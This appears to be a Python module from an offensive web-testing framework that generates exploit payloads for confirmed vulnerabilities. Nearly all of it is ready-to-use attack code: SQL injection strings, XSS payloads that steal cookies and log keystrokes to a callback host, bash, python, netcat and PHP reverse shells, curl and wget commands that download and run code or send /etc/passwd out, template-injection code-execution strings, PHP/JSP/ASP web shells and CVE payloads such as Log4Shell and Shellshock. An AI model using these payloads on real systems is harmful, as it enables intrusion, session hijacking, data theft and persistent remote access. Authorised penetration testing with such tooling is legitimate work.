#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK v9.0 - ULTIMATE EDITION
Payload Generator – Partition 2

Generates custom payloads, POCs, and exploit code for confirmed
vulnerabilities.  Used by the Attack Router when a finding needs a
tailored exploit rather than a generic test payload.

Capabilities:
  - SQL Injection: SQLMap-style payloads (UNION, error, blind, time)
  - XSS: Cookie stealer, keylogger, phishing overlay payloads
  - Command Injection: Reverse shell, bind shell, download-and-exec
  - LFI: PHP filter chains, log poisoning payloads
  - SSTI: Engine-specific RCE payloads (Jinja2, Twig, Freemarker, etc.)
  - XXE: OOB data exfiltration payloads
  - CVE: POC stub generation for known CVEs
  - Shell: PHP/JSP/ASP web shell code generation
"""

import re
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# SQL Injection payloads (sqlmap-style)
# ---------------------------------------------------------------------------

SQLI_PAYLOADS = {
    "union_detect": [
        "' ORDER BY {n}-- -",
        "' UNION SELECT {nulls}-- -",
    ],
    "error_based": {
        "mysql": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -",
        "postgresql": "' AND 1=CAST((SELECT version()) AS int)-- -",
        "mssql": "' AND 1=CONVERT(int,(SELECT @@version))-- -",
        "oracle": "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
        "sqlite": "' AND 1=CAST((SELECT sqlite_version()) AS int)-- -",
    },
    "time_based": {
        "mysql": "' AND SLEEP({delay})-- -",
        "postgresql": "' AND pg_sleep({delay})-- -",
        "mssql": "'; WAITFOR DELAY '0:0:{delay}'-- -",
        "oracle": "' AND DBMS_LOCK.SLEEP({delay}) IS NOT NULL-- -",
        "sqlite": "' AND {delay}=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
    },
    "data_extract": {
        "mysql": "' UNION SELECT {nulls_before}CONCAT(0x41414158545243544141,({subquery}),0x41414158545243544141){nulls_after}-- -",
        "postgresql": "' UNION SELECT {nulls_before}({subquery})::text{nulls_after}-- -",
        "mssql": "' UNION SELECT {nulls_before}CAST(({subquery}) AS varchar(4000)){nulls_after}-- -",
    },
}


# ---------------------------------------------------------------------------
# XSS payloads
# ---------------------------------------------------------------------------

XSS_PAYLOADS = {
    "cookie_stealer": ('<script>new Image().src="https://{{callback}}/steal?c="+document.cookie</script>'),
    "keylogger": (
        "<script>document.onkeypress=function(e){new Image().src=" '"https://{{callback}}/keys?k="+e.key;}</script>'
    ),
    "dom_redirect": (
        '<script>window.location="https://{{callback}}/phish?url="+encodeURIComponent(document.URL)</script>'
    ),
    "stored_xss_img": (
        "<img src=x onerror=\"fetch('https://{{callback}}/xss',{method:'POST'," 'body:document.cookie})">'
    ),
    "polyglot": (
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%%0telerik%%0dOnabort%%0concut%%0e"
        "onfocusin%%0conload%%0onfocus// \\x3csVg/\\x3e\\x3cSvg/onload=alert(1)//>/%0D%0A%0d%0a//</stYle"
        "/</titLe/</teXtarEa/</scRipt/--!>\\x3ciMg/src/onerror=alert(1)//>\\x3e"
    ),
}


# ---------------------------------------------------------------------------
# Command Injection payloads
# ---------------------------------------------------------------------------

CMDI_PAYLOADS = {
    "reverse_shell": {
        "bash": "bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1",
        "python": 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{{lhost}}",{{lport}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{lhost}} {{lport}} >/tmp/f",
        "php": 'php -r \'$sock=fsockopen("{{lhost}}",{{lport}});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    },
    "download_exec": {
        "wget": "wget -q https://{{callback}}/payload -O /tmp/.p && chmod +x /tmp/.p && /tmp/.p",
        "curl": "curl -s https://{{callback}}/payload -o /tmp/.p && chmod +x /tmp/.p && /tmp/.p",
    },
    "data_exfil": {
        "curl": 'curl -s -X POST -d "$(cat /etc/passwd)" https://{{callback}}/exfil',
        "wget": 'wget -q --post-data="$(cat /etc/passwd)" https://{{callback}}/exfil',
    },
}


# ---------------------------------------------------------------------------
# SSTI payloads (engine-specific)
# ---------------------------------------------------------------------------

SSTI_PAYLOADS = {
    "jinja2": {
        "rce": "{{request.application.__globals__.__builtins__.__import__('os').popen('{{cmd}}').read()}}",
        "file_read": "{{request.application.__globals__.__builtins__.open('{{path}}').read()}}",
        "detect": "{{7*7}}",
    },
    "twig": {
        "rce": "{{['{{cmd}}']|filter('system')}}",
        "file_read": "{{'/etc/passwd'|file_excerpt(1,30)}}",
        "detect": "{{7*7}}",
    },
    "freemarker": {
        "rce": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{{cmd}}")}',
        "detect": "${7*7}",
    },
    "velocity": {
        "rce": '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("{{cmd}}"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
        "detect": "#set($x=7*7)$x",
    },
    "mako": {
        "rce": "<%import os;x=os.popen('{{cmd}}').read()%>${x}",
        "detect": "${7*7}",
    },
    "erb": {
        "rce": "<%= `{{cmd}}` %>",
        "detect": "<%= 7*7 %>",
    },
}


# ---------------------------------------------------------------------------
# Web shell templates
# ---------------------------------------------------------------------------

SHELL_TEMPLATES = {
    "php_mini": '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>',
    "php_eval": '<?php if(isset($_REQUEST["c"])){eval($_REQUEST["c"]);} ?>',
    "php_stealth": ('<?php $k="{{key}}";if(md5($_REQUEST["k"])===$k)' '{@eval(base64_decode($_REQUEST["c"]));} ?>'),
    "jsp_mini": (
        '<%@ page import="java.util.*,java.io.*"%>'
        '<%if(request.getParameter("c")!=null){Process p=Runtime.getRuntime()'
        '.exec(request.getParameter("c"));Scanner s=new Scanner(p.getInputStream())'
        '.useDelimiter("\\\\A");out.println(s.hasNext()?s.next():"");}%>'
    ),
    "asp_mini": (
        '<%@ Language=VBScript %><%If Request("c")<>"" Then%>'
        '<%Set oS=Server.CreateObject("WSCRIPT.SHELL"):Set oE=oS.Exec(Request("c")):'
        "Response.Write(oE.StdOut.ReadAll())%><%End If%>"
    ),
}


# ---------------------------------------------------------------------------
# CVE exploit stubs
# ---------------------------------------------------------------------------

CVE_EXPLOIT_STUBS = {
    "log4j": {
        "cve": "CVE-2021-44228",
        "payload": "${jndi:ldap://{{callback}}/a}",
        "description": "Log4Shell - JNDI lookup injection via Log4j",
        "severity": "CRITICAL",
    },
    "spring4shell": {
        "cve": "CVE-2022-22965",
        "payload": "class.module.classLoader.URLs[0]=https://{{callback}}/shell",
        "description": "Spring4Shell - ClassLoader manipulation",
        "severity": "CRITICAL",
    },
    "apache_struts": {
        "cve": "CVE-2017-5638",
        "payload": '%{(#_memberAccess["allowStaticMethodAccess"]=true).(@java.lang.Runtime@getRuntime().exec("{{cmd}}"))}',
        "description": "Apache Struts RCE via Content-Type OGNL injection",
        "severity": "CRITICAL",
    },
    "shellshock": {
        "cve": "CVE-2014-6271",
        "payload": '() { :; }; /bin/bash -c "{{cmd}}"',
        "description": "Shellshock Bash function export RCE",
        "severity": "CRITICAL",
    },
    "heartbleed": {
        "cve": "CVE-2014-0160",
        "description": "OpenSSL Heartbleed memory disclosure",
        "severity": "HIGH",
    },
    "eternalblue": {
        "cve": "CVE-2017-0144",
        "description": "SMBv1 Remote Code Execution (EternalBlue)",
        "severity": "CRITICAL",
    },
}


# ---------------------------------------------------------------------------
# PayloadGenerator class
# ---------------------------------------------------------------------------


class PayloadGenerator:
    """Generates tailored payloads and POCs for confirmed vulnerabilities.

    Used by the Attack Router to produce exploit-ready payloads when
    generic test payloads are insufficient.
    """

    def __init__(self, callback_host: str = "{{CALLBACK}}", lhost: str = "{{LHOST}}", lport: int = 4444):
        self.callback = callback_host
        self.lhost = lhost
        self.lport = lport

    # ------------------------------------------------------------------
    # SQL Injection payloads
    # ------------------------------------------------------------------

    def sqli_union_payload(
        self, column_count: int, inject_col: int = 1, subquery: str = "SELECT version()", db_type: str = "mysql"
    ) -> str:
        """Generate a UNION-based SQLi payload."""
        cols = []
        for i in range(1, column_count + 1):
            if i == inject_col:
                tpl = SQLI_PAYLOADS["data_extract"].get(db_type, "")
                if tpl:
                    cols.append(f"({subquery})")
                else:
                    cols.append(f"({subquery})")
            else:
                cols.append("NULL")
        return f"' UNION SELECT {','.join(cols)}-- -"

    def sqli_time_payload(self, db_type: str = "mysql", delay: int = 5) -> str:
        """Generate a time-based blind SQLi payload."""
        tpl = SQLI_PAYLOADS["time_based"].get(db_type, "")
        return tpl.replace("{delay}", str(delay))

    def sqli_error_payload(self, db_type: str = "mysql") -> str:
        """Generate an error-based SQLi payload."""
        return SQLI_PAYLOADS["error_based"].get(db_type, "")

    # ------------------------------------------------------------------
    # XSS payloads
    # ------------------------------------------------------------------

    def xss_cookie_stealer(self, callback: str = None) -> str:
        """Generate a cookie-stealing XSS payload."""
        cb = callback or self.callback
        return XSS_PAYLOADS["cookie_stealer"].replace("{{callback}}", cb)

    def xss_keylogger(self, callback: str = None) -> str:
        """Generate a keylogger XSS payload."""
        cb = callback or self.callback
        return XSS_PAYLOADS["keylogger"].replace("{{callback}}", cb)

    def xss_polyglot(self) -> str:
        """Return a polyglot XSS payload."""
        return XSS_PAYLOADS["polyglot"]

    # ------------------------------------------------------------------
    # Command Injection payloads
    # ------------------------------------------------------------------

    def reverse_shell(self, shell_type: str = "bash", lhost: str = None, lport: int = None) -> str:
        """Generate a reverse shell payload."""
        host = lhost or self.lhost
        port = lport or self.lport
        tpl = CMDI_PAYLOADS["reverse_shell"].get(shell_type, "")
        return tpl.replace("{{lhost}}", host).replace("{{lport}}", str(port))

    def data_exfil_payload(self, method: str = "curl", callback: str = None) -> str:
        """Generate a data exfiltration payload."""
        cb = callback or self.callback
        tpl = CMDI_PAYLOADS["data_exfil"].get(method, "")
        return tpl.replace("{{callback}}", cb)

    # ------------------------------------------------------------------
    # SSTI payloads
    # ------------------------------------------------------------------

    def ssti_rce(self, engine: str = "jinja2", cmd: str = "id") -> str:
        """Generate an SSTI RCE payload for the specified engine."""
        payloads = SSTI_PAYLOADS.get(engine, {})
        tpl = payloads.get("rce", "")
        return tpl.replace("{{cmd}}", cmd)

    def ssti_file_read(self, engine: str = "jinja2", path: str = "/etc/passwd") -> str:
        """Generate an SSTI file-read payload."""
        payloads = SSTI_PAYLOADS.get(engine, {})
        tpl = payloads.get("file_read", "")
        return tpl.replace("{{path}}", path)

    # ------------------------------------------------------------------
    # Web shell generation
    # ------------------------------------------------------------------

    def web_shell(self, shell_type: str = "php_mini", key: str = None) -> str:
        """Generate a web shell payload."""
        tpl = SHELL_TEMPLATES.get(shell_type, SHELL_TEMPLATES["php_mini"])
        if key and "{{key}}" in tpl:
            import hashlib

            tpl = tpl.replace("{{key}}", hashlib.md5(key.encode()).hexdigest())
        return tpl

    # ------------------------------------------------------------------
    # CVE exploit stubs
    # ------------------------------------------------------------------

    def cve_exploit(self, cve_id: str, cmd: str = "id", callback: str = None) -> dict:
        """Look up a CVE and return the exploit stub with payload."""
        cb = callback or self.callback
        cve_lower = cve_id.lower().replace("cve-", "")

        # Search by CVE ID or common name
        for name, stub in CVE_EXPLOIT_STUBS.items():
            if cve_lower in stub["cve"].lower().replace("cve-", "") or cve_lower in name.lower():
                result = dict(stub)
                if "payload" in result:
                    result["payload"] = result["payload"].replace("{{callback}}", cb).replace("{{cmd}}", cmd)
                return result

        return {
            "cve": cve_id,
            "description": f"No built-in exploit stub for {cve_id}",
            "severity": "UNKNOWN",
        }

    # ------------------------------------------------------------------
    # POC generation
    # ------------------------------------------------------------------

    def generate_poc(self, finding) -> dict:
        """Generate a proof-of-concept for a confirmed finding.

        Returns a dict with 'title', 'description', 'payload', 'steps',
        and 'curl_command'.
        """
        from core.attack_router import AttackRouter

        family = AttackRouter.classify(finding)

        poc = {
            "title": f"POC: {finding.technique}",
            "target": finding.url,
            "parameter": finding.param,
            "method": finding.method,
            "severity": finding.severity,
            "family": family,
            "original_payload": finding.payload,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

        # Generate family-specific POC
        if family == "sqli":
            poc["exploit_payloads"] = {
                "error_based": self.sqli_error_payload("mysql"),
                "time_based": self.sqli_time_payload("mysql"),
            }
            poc["description"] = (
                f'SQL Injection confirmed in parameter "{finding.param}" '
                f"at {finding.url}. Use the payloads below for data extraction."
            )
        elif family == "xss":
            poc["exploit_payloads"] = {
                "cookie_stealer": self.xss_cookie_stealer(),
                "keylogger": self.xss_keylogger(),
            }
            poc["description"] = (
                f'XSS confirmed in parameter "{finding.param}". '
                f"Payloads below can steal session cookies or log keystrokes."
            )
        elif family == "cmdi":
            poc["exploit_payloads"] = {
                "reverse_shell_bash": self.reverse_shell("bash"),
                "reverse_shell_python": self.reverse_shell("python"),
                "data_exfil": self.data_exfil_payload(),
            }
            poc["description"] = (
                f'Command Injection confirmed in parameter "{finding.param}". ' f"Full RCE is possible."
            )
        elif family == "ssti":
            poc["exploit_payloads"] = {
                "jinja2_rce": self.ssti_rce("jinja2", "id"),
                "twig_rce": self.ssti_rce("twig", "id"),
            }
            poc["description"] = f'SSTI confirmed in parameter "{finding.param}". ' f"Template engine RCE is possible."
        elif family == "lfi":
            poc["exploit_payloads"] = {
                "etc_passwd": "../../../etc/passwd",
                "php_filter": "php://filter/convert.base64-encode/resource=index",
                "proc_self": "../../../proc/self/environ",
            }
            poc["description"] = f'LFI confirmed in parameter "{finding.param}". ' f"Arbitrary file read is possible."
        elif family == "upload":
            poc["exploit_payloads"] = {
                "php_shell": self.web_shell("php_mini"),
                "jsp_shell": self.web_shell("jsp_mini"),
            }
            poc["description"] = "Unrestricted file upload confirmed. Web shell deployment is possible."
        elif family == "cve":
            # Try to extract CVE ID from technique
            cve_match = re.search(r"CVE-\d{4}-\d+", finding.technique, re.IGNORECASE)
            if cve_match:
                cve_data = self.cve_exploit(cve_match.group())
                poc["exploit_payloads"] = {"cve_payload": cve_data.get("payload", "")}
                poc["description"] = cve_data.get("description", "")
            else:
                poc["description"] = f"CVE-based exploit for {finding.technique}"
        else:
            poc["description"] = (
                f"Vulnerability confirmed: {finding.technique} " f'in parameter "{finding.param}" at {finding.url}.'
            )

        # Generate curl command for reproduction
        poc["curl_command"] = self._generate_curl(finding)
        poc["steps"] = self._generate_steps(finding, family)

        return poc

    def _generate_curl(self, finding) -> str:
        """Generate a curl command to reproduce the finding."""
        payload_safe = self._escape_shell(finding.payload)
        if finding.method.upper() == "GET":
            sep = "&" if "?" in finding.url else "?"
            return f"curl -v '{finding.url}{sep}{finding.param}='{payload_safe}"
        else:
            return f"curl -v -X POST '{finding.url}' " f"-d '{finding.param}='{payload_safe}"

    @staticmethod
    def _escape_shell(value: str) -> str:
        """Escape a string for safe use in a shell argument."""
        if not value:
            return ""
        import shlex

        return shlex.quote(value)

    @staticmethod
    def _generate_steps(finding, family: str) -> list:
        """Generate reproduction steps for the POC."""
        steps = [
            f"1. Navigate to {finding.url}",
            f"2. Identify the vulnerable parameter: {finding.param}",
            f"3. Inject the payload: {finding.payload}",
        ]
        if family == "sqli":
            steps.append("4. Observe SQL error message or altered response")
            steps.append("5. Use UNION/blind techniques for data extraction")
        elif family == "xss":
            steps.append("4. Observe script execution in browser context")
            steps.append("5. Craft payload for cookie theft or session hijacking")
        elif family == "cmdi":
            steps.append("4. Observe command output in response")
            steps.append("5. Escalate to reverse shell for persistent access")
        elif family == "lfi":
            steps.append("4. Read /etc/passwd or application source code")
            steps.append("5. Attempt log poisoning for RCE escalation")
        elif family == "ssti":
            steps.append("4. Confirm math expression evaluation (e.g., 7*7=49)")
            steps.append("5. Escalate to OS command execution via template engine")
        return steps
